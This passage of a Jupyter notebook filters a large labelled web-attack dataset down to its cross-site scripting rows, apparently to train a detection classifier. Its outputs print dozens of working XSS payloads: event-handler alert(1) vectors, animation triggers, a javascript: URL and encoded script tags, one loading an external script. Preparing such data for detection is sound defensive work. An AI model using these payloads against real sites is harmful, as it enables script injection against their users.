         "<article onpointerleave=alert(1)>XSS</article>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "27",
         "<nextid onmousemove=\"alert(1)\">test</nextid>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "28",
         "javascript:document.location=",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "29",
         "<style>@keyframes x{}</style><area style=\"animation-name:x\" onanimationend=\"alert(1)\"></area>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "30",
         "<blockquote onpointermove=alert(1)>XSS</blockquote>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "31",
         "<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "32",
         "<style>@keyframes x{}</style><title style=\"animation-name:x\" onanimationend=\"alert(1)\"></title>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "33",
         "<noembed onpointerout=alert(1)>XSS</noembed>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "34",
         "<data onbeforecut=\"alert(1)\" contenteditable>test</data>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "35",
         "<A HREF=\"http://ha.ckers.org@google\"></A>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "36",
         "<plaintext oncut=\"alert(1)\" contenteditable>test</plaintext>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "37",
         "<s onmousedown=\"alert(1)\">test</s>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "38",
         "<address onkeypress=\"alert(1)\" contenteditable>test</address>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "39",
         "<optgroup onmouseover=\"alert(1)\">test</optgroup>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "40",
         "<script onmouseover=\"alert(1)\">test</script>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "41",
         "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></sub>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "42",
         "<image onclick=\"alert(1)\">test</image>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "43",
         "<tfoot onclick=\"alert(1)\">test</tfoot>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "44",
         "<ul onpointerenter=alert(1)>XSS</ul>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "45",
         "<bdo draggable=\"true\" ondragenter=\"alert(1)\">test</bdo>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "46",
         "<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "47",
         "<style>@keyframes slidein {}</style><shadow style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></shadow>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "48",
         "<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ],
        [
         "49",
         "<dd onmouseout=\"alert(1)\">test</dd>",
         "0.0",
         "1.0",
         "0.0",
         "0.0"
        ]
       ],
       "shape": {
        "columns": 5,
        "rows": 40799
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Sentence</th>\n",
       "      <th>SQLInjection</th>\n",
       "      <th>XSS</th>\n",
       "      <th>CommandInjection</th>\n",
       "      <th>Normal</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>&lt;tt onmouseover=\"alert(1)\"&gt;test&lt;/tt&gt;</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>&lt;a onblur=alert(1) tabindex=1 id=x&gt;&lt;/a&gt;&lt;input ...</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>&lt;col draggable=\"true\" ondragenter=\"alert(1)\"&gt;t...</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>&lt;caption onpointerdown=alert(1)&gt;XSS&lt;/caption&gt;</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>&lt;caption id=x tabindex=1 ondeactivate=alert(1)...</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40794</th>\n",
       "      <td>produto=%22%3E'%3E%3CSCRIPT%3Ealert(String.fro...</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40795</th>\n",
       "      <td>m=%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharC...</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40796</th>\n",
       "      <td>q=%3Cscript%3Ealert%28%22m%22%29%3C/script%3E</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40797</th>\n",
       "      <td>Search=%22%3E'%3E%3CSCRIPT%20SRC=http://br.zon...</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40798</th>\n",
       "      <td>method=show&amp;lojaPrincipal=&amp;areaName=busca&amp;nome...</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>40799 rows × 5 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                Sentence  SQLInjection  XSS  \\\n",
       "0                   <tt onmouseover=\"alert(1)\">test</tt>           0.0  1.0   \n",
       "1      <a onblur=alert(1) tabindex=1 id=x></a><input ...           0.0  1.0   \n",
       "2      <col draggable=\"true\" ondragenter=\"alert(1)\">t...           0.0  1.0   \n",
       "3          <caption onpointerdown=alert(1)>XSS</caption>           0.0  1.0   \n",
       "4      <caption id=x tabindex=1 ondeactivate=alert(1)...           0.0  1.0   \n",
       "...                                                  ...           ...  ...   \n",
       "40794  produto=%22%3E'%3E%3CSCRIPT%3Ealert(String.fro...           0.0  1.0   \n",
       "40795  m=%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharC...           0.0  1.0   \n",
       "40796      q=%3Cscript%3Ealert%28%22m%22%29%3C/script%3E           0.0  1.0   \n",
       "40797  Search=%22%3E'%3E%3CSCRIPT%20SRC=http://br.zon...           0.0  1.0   \n",
       "40798  method=show&lojaPrincipal=&areaName=busca&nome...           0.0  1.0   \n",
       "\n",
       "       CommandInjection  Normal  \n",
       "0                   0.0     0.0  \n",
       "1                   0.0     0.0  \n",
       "2                   0.0     0.0  \n",
       "3                   0.0     0.0  \n",
       "4                   0.0     0.0  \n",
       "...                 ...     ...  \n",
       "40794               0.0     0.0  \n",
       "40795               0.0     0.0  \n",
       "40796               0.0     0.0  \n",
       "40797               0.0     0.0  \n",
       "40798               0.0     0.0  \n",
       "\n",
       "[40799 rows x 5 columns]"
      ]
     },
     "execution_count": 764,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_scxm = sxcm[sxcm[\"XSS\"] == 1]\n",
    "xss_scxm.reset_index(drop=True, inplace=True)\n",
    "xss_scxm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 765,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/932665559.py:2: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  xss_scxm.rename(columns={\"Sentence\": \"payload\", \"XSS\": \"xss\"}, inplace=True)\n"
     ]
    },
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "float64",
         "type": "float"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "e78ad557-b77c-4509-8bfb-99c6e06bc6a0",
       "rows": [
        [
         "0",
         "<tt onmouseover=\"alert(1)\">test</tt>",
         "1.0"
        ],
        [
         "1",
         "<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>",
         "1.0"
        ],
        [
         "2",
         "<col draggable=\"true\" ondragenter=\"alert(1)\">test</col>",
         "1.0"
        ],
        [
         "3",
         "<caption onpointerdown=alert(1)>XSS</caption>",
         "1.0"
        ],
        [
         "4",
         "<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>",
         "1.0"
        ],
        [
         "5",
         "<style onmouseleave=\"alert(1)\">test</style>",
         "1.0"
        ],
        [
         "6",
         "<svg><meta onload=alert(1)></meta>",
         "1.0"
        ],
        [
         "7",
         "<figcaption onpointerleave=alert(1)>XSS</figcaption>",
         "1.0"
        ],
        [
         "8",
         "<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>",
         "1.0"
        ],
        [
         "9",
         "<input type=image src=1 onerror=alert(1)>",
         "1.0"
        ],
        [
         "10",
         "<strong ondblclick=\"alert(1)\">test</strong>",
         "1.0"
        ],
        [
         "11",
         "<div draggable=\"true\" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>",
         "1.0"
        ],
        [
         "12",
         "<spacer onkeypress=\"alert(1)\" contenteditable>test</spacer>",
         "1.0"
        ],
        [
         "13",
         "<style>@keyframes slidein {}</style><center style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></center>",
         "1.0"
        ],
        [
         "14",
         "<pre draggable=\"true\" ondragend=\"alert(1)\">test</pre>",
         "1.0"
        ],
        [
         "15",
         "<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>",
         "1.0"
        ],
        [
         "16",
         "<style>@keyframes x{}</style><main style=\"animation-name:x\" onanimationstart=\"alert(1)\"></main>",
         "1.0"
        ],
        [
         "17",
         "<article draggable=\"true\" ondrag=\"alert(1)\">test</article>",
         "1.0"
        ],
        [
         "18",
         "<rtc draggable=\"true\" ondragleave=\"alert(1)\">test</rtc>",
         "1.0"
        ],
        [
         "19",
         "<div draggable=\"true\" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>",
         "1.0"
        ],
        [
         "20",
         "<frame oncut=\"alert(1)\" contenteditable>test</frame>",
         "1.0"
        ],
        [
         "21",
         "<frameset onmouseover=\"alert(1)\">test</frameset>",
         "1.0"
        ],
        [
         "22",
         "<style>@keyframes x{}</style><nobr style=\"animation-name:x\" onanimationstart=\"alert(1)\"></nobr>",
         "1.0"
        ],
        [
         "23",
         "<iframe onload=alert(1)></iframe>",
         "1.0"
        ],
        [
         "24",
         "<strong draggable=\"true\" ondragstart=\"alert(1)\">test</strong>",
         "1.0"
        ],
        [
         "25",
         "<style>@keyframes x{}</style><h1 style=\"animation-name:x\" onanimationstart=\"alert(1)\"></h1>",
         "1.0"
        ],
        [
         "26",
         "<article onpointerleave=alert(1)>XSS</article>",
         "1.0"
        ],
        [
         "27",
         "<nextid onmousemove=\"alert(1)\">test</nextid>",
         "1.0"
        ],
        [
         "28",
         "javascript:document.location=",
         "1.0"
        ],
        [
         "29",
         "<style>@keyframes x{}</style><area style=\"animation-name:x\" onanimationend=\"alert(1)\"></area>",
         "1.0"
        ],
        [
         "30",
         "<blockquote onpointermove=alert(1)>XSS</blockquote>",
         "1.0"
        ],
        [
         "31",
         "<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>",
         "1.0"
        ],
        [
         "32",
         "<style>@keyframes x{}</style><title style=\"animation-name:x\" onanimationend=\"alert(1)\"></title>",
         "1.0"
        ],
        [
         "33",
         "<noembed onpointerout=alert(1)>XSS</noembed>",
         "1.0"
        ],
        [
         "34",
         "<data onbeforecut=\"alert(1)\" contenteditable>test</data>",
         "1.0"
        ],
        [
         "35",
         "<A HREF=\"http://ha.ckers.org@google\"></A>",
         "1.0"
        ],
        [
         "36",
         "<plaintext oncut=\"alert(1)\" contenteditable>test</plaintext>",
         "1.0"
        ],
        [
         "37",
         "<s onmousedown=\"alert(1)\">test</s>",
         "1.0"
        ],
        [
         "38",
         "<address onkeypress=\"alert(1)\" contenteditable>test</address>",
         "1.0"
        ],
        [
         "39",
         "<optgroup onmouseover=\"alert(1)\">test</optgroup>",
         "1.0"
        ],
        [
         "40",
         "<script onmouseover=\"alert(1)\">test</script>",
         "1.0"
        ],
        [
         "41",
         "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></sub>",
         "1.0"
        ],
        [
         "42",
         "<image onclick=\"alert(1)\">test</image>",
         "1.0"
        ],
        [
         "43",
         "<tfoot onclick=\"alert(1)\">test</tfoot>",
         "1.0"
        ],
        [
         "44",
         "<ul onpointerenter=alert(1)>XSS</ul>",
         "1.0"
        ],
        [
         "45",
         "<bdo draggable=\"true\" ondragenter=\"alert(1)\">test</bdo>",
         "1.0"
        ],
        [
         "46",
         "<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>",
         "1.0"
        ],
        [
         "47",
         "<style>@keyframes slidein {}</style><shadow style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></shadow>",
         "1.0"
        ],
        [
         "48",
         "<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>",
         "1.0"
        ],
        [
         "49",
         "<dd onmouseout=\"alert(1)\">test</dd>",
         "1.0"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 40799
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>&lt;tt onmouseover=\"alert(1)\"&gt;test&lt;/tt&gt;</td>\n",
       "      <td>1.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>&lt;a onblur=alert(1) tabindex=1 id=x&gt;&lt;/a&gt;&lt;input ...</td>\n",
       "      <td>1.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>&lt;col draggable=\"true\" ondragenter=\"alert(1)\"&gt;t...</td>\n",
       "      <td>1.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>&lt;caption onpointerdown=alert(1)&gt;XSS&lt;/caption&gt;</td>\n",
       "      <td>1.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>&lt;caption id=x tabindex=1 ondeactivate=alert(1)...</td>\n",
       "      <td>1.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40794</th>\n",
       "      <td>produto=%22%3E'%3E%3CSCRIPT%3Ealert(String.fro...</td>\n",
       "      <td>1.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40795</th>\n",
       "      <td>m=%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharC...</td>\n",
       "      <td>1.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40796</th>\n",
       "      <td>q=%3Cscript%3Ealert%28%22m%22%29%3C/script%3E</td>\n",
       "      <td>1.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40797</th>\n",
       "      <td>Search=%22%3E'%3E%3CSCRIPT%20SRC=http://br.zon...</td>\n",
       "      <td>1.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40798</th>\n",
       "      <td>method=show&amp;lojaPrincipal=&amp;areaName=busca&amp;nome...</td>\n",
       "      <td>1.0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>40799 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                 payload  xss\n",
       "0                   <tt onmouseover=\"alert(1)\">test</tt>  1.0\n",
       "1      <a onblur=alert(1) tabindex=1 id=x></a><input ...  1.0\n",
       "2      <col draggable=\"true\" ondragenter=\"alert(1)\">t...  1.0\n",
       "3          <caption onpointerdown=alert(1)>XSS</caption>  1.0\n",
       "4      <caption id=x tabindex=1 ondeactivate=alert(1)...  1.0\n",
       "...                                                  ...  ...\n",
       "40794  produto=%22%3E'%3E%3CSCRIPT%3Ealert(String.fro...  1.0\n",
       "40795  m=%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharC...  1.0\n",
       "40796      q=%3Cscript%3Ealert%28%22m%22%29%3C/script%3E  1.0\n",
       "40797  Search=%22%3E'%3E%3CSCRIPT%20SRC=http://br.zon...  1.0\n",
       "40798  method=show&lojaPrincipal=&areaName=busca&nome...  1.0\n",
       "\n",
       "[40799 rows x 2 columns]"
      ]
     },
     "execution_count": 765,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_scxm = xss_scxm[[\"Sentence\", \"XSS\"]]\n",
    "xss_scxm.rename(columns={\"Sentence\": \"payload\", \"XSS\": \"xss\"}, inplace=True)\n",
    "xss_scxm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 766,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/836902300.py:1: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  xss_scxm[\"xss\"] = xss_scxm[\"xss\"].apply(lambda x: int(1) if x == 1 else 0)\n"
     ]
    },
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "int64",
         "type": "integer"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "745b1aa5-fa72-4504-a39c-2c67ad6d2ba4",
       "rows": [
        [
         "0",
         "<tt onmouseover=\"alert(1)\">test</tt>",
         "1"
        ],
        [
         "1",
         "<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>",
         "1"
        ],
        [
         "2",
         "<col draggable=\"true\" ondragenter=\"alert(1)\">test</col>",
         "1"
        ],
        [
         "3",
         "<caption onpointerdown=alert(1)>XSS</caption>",
         "1"
        ],
        [
         "4",
         "<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>",
         "1"
        ],
        [
         "5",
         "<style onmouseleave=\"alert(1)\">test</style>",
         "1"
        ],
        [
         "6",
         "<svg><meta onload=alert(1)></meta>",
         "1"
        ],
        [
         "7",
         "<figcaption onpointerleave=alert(1)>XSS</figcaption>",
         "1"
        ],
        [
         "8",
         "<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>",
         "1"
        ],
        [
         "9",
         "<input type=image src=1 onerror=alert(1)>",
         "1"
        ],
        [
         "10",
         "<strong ondblclick=\"alert(1)\">test</strong>",
         "1"
        ],
        [
         "11",
         "<div draggable=\"true\" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>",
         "1"
        ],
        [
         "12",
         "<spacer onkeypress=\"alert(1)\" contenteditable>test</spacer>",
         "1"
        ],
        [
         "13",
         "<style>@keyframes slidein {}</style><center style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></center>",
         "1"
        ],
        [
         "14",
         "<pre draggable=\"true\" ondragend=\"alert(1)\">test</pre>",
         "1"
        ],
        [
         "15",
         "<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>",
         "1"
        ],
        [
         "16",
         "<style>@keyframes x{}</style><main style=\"animation-name:x\" onanimationstart=\"alert(1)\"></main>",
         "1"
        ],
        [
         "17",
         "<article draggable=\"true\" ondrag=\"alert(1)\">test</article>",
         "1"
        ],
        [
         "18",
         "<rtc draggable=\"true\" ondragleave=\"alert(1)\">test</rtc>",
         "1"
        ],
        [
         "19",
         "<div draggable=\"true\" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>",
         "1"
        ],
        [
         "20",
         "<frame oncut=\"alert(1)\" contenteditable>test</frame>",
         "1"
        ],
        [
         "21",
         "<frameset onmouseover=\"alert(1)\">test</frameset>",
         "1"
        ],
        [
         "22",
         "<style>@keyframes x{}</style><nobr style=\"animation-name:x\" onanimationstart=\"alert(1)\"></nobr>",
         "1"
        ],
        [
         "23",
         "<iframe onload=alert(1)></iframe>",
         "1"
        ],
        [
         "24",
         "<strong draggable=\"true\" ondragstart=\"alert(1)\">test</strong>",
         "1"
        ],
        [
         "25",
         "<style>@keyframes x{}</style><h1 style=\"animation-name:x\" onanimationstart=\"alert(1)\"></h1>",
         "1"
        ],
        [
         "26",
         "<article onpointerleave=alert(1)>XSS</article>",
         "1"
        ],
        [
         "27",
         "<nextid onmousemove=\"alert(1)\">test</nextid>",
         "1"
        ],
        [
         "28",
         "javascript:document.location=",
         "1"
        ],
        [
         "29",
         "<style>@keyframes x{}</style><area style=\"animation-name:x\" onanimationend=\"alert(1)\"></area>",
         "1"
        ],
        [
         "30",
         "<blockquote onpointermove=alert(1)>XSS</blockquote>",
         "1"
        ],
        [
         "31",
         "<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>",
         "1"
        ],
        [
         "32",
         "<style>@keyframes x{}</style><title style=\"animation-name:x\" onanimationend=\"alert(1)\"></title>",
         "1"
        ],
        [
         "33",
         "<noembed onpointerout=alert(1)>XSS</noembed>",
         "1"
        ],
        [
         "34",
         "<data onbeforecut=\"alert(1)\" contenteditable>test</data>",
         "1"
        ],
        [
         "35",
         "<A HREF=\"http://ha.ckers.org@google\"></A>",
         "1"
        ],
        [
         "36",
         "<plaintext oncut=\"alert(1)\" contenteditable>test</plaintext>",
         "1"
        ],
        [
         "37",
         "<s onmousedown=\"alert(1)\">test</s>",
         "1"
        ],
        [
         "38",
         "<address onkeypress=\"alert(1)\" contenteditable>test</address>",
         "1"
        ],
        [
         "39",
         "<optgroup onmouseover=\"alert(1)\">test</optgroup>",
         "1"
        ],
        [
         "40",
         "<script onmouseover=\"alert(1)\">test</script>",
         "1"
        ],
        [
         "41",
         "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></sub>",
         "1"
        ],
        [
         "42",
         "<image onclick=\"alert(1)\">test</image>",
         "1"
        ],
        [
         "43",
         "<tfoot onclick=\"alert(1)\">test</tfoot>",
         "1"
        ],
        [
         "44",
         "<ul onpointerenter=alert(1)>XSS</ul>",
         "1"
        ],
        [
         "45",
         "<bdo draggable=\"true\" ondragenter=\"alert(1)\">test</bdo>",
         "1"
        ],
        [
         "46",
         "<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>",
         "1"
        ],
        [
         "47",
         "<style>@keyframes slidein {}</style><shadow style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></shadow>",
         "1"
        ],
        [
         "48",
         "<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>",
         "1"
        ],
        [
         "49",
         "<dd onmouseout=\"alert(1)\">test</dd>",
         "1"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 40799
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>&lt;tt onmouseover=\"alert(1)\"&gt;test&lt;/tt&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>&lt;a onblur=alert(1) tabindex=1 id=x&gt;&lt;/a&gt;&lt;input ...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>&lt;col draggable=\"true\" ondragenter=\"alert(1)\"&gt;t...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>&lt;caption onpointerdown=alert(1)&gt;XSS&lt;/caption&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>&lt;caption id=x tabindex=1 ondeactivate=alert(1)...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40794</th>\n",
       "      <td>produto=%22%3E'%3E%3CSCRIPT%3Ealert(String.fro...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40795</th>\n",
       "      <td>m=%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharC...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40796</th>\n",
       "      <td>q=%3Cscript%3Ealert%28%22m%22%29%3C/script%3E</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40797</th>\n",
       "      <td>Search=%22%3E'%3E%3CSCRIPT%20SRC=http://br.zon...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40798</th>\n",
       "      <td>method=show&amp;lojaPrincipal=&amp;areaName=busca&amp;nome...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>40799 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                 payload  xss\n",
       "0                   <tt onmouseover=\"alert(1)\">test</tt>    1\n",
       "1      <a onblur=alert(1) tabindex=1 id=x></a><input ...    1\n",
       "2      <col draggable=\"true\" ondragenter=\"alert(1)\">t...    1\n",
       "3          <caption onpointerdown=alert(1)>XSS</caption>    1\n",
       "4      <caption id=x tabindex=1 ondeactivate=alert(1)...    1\n",
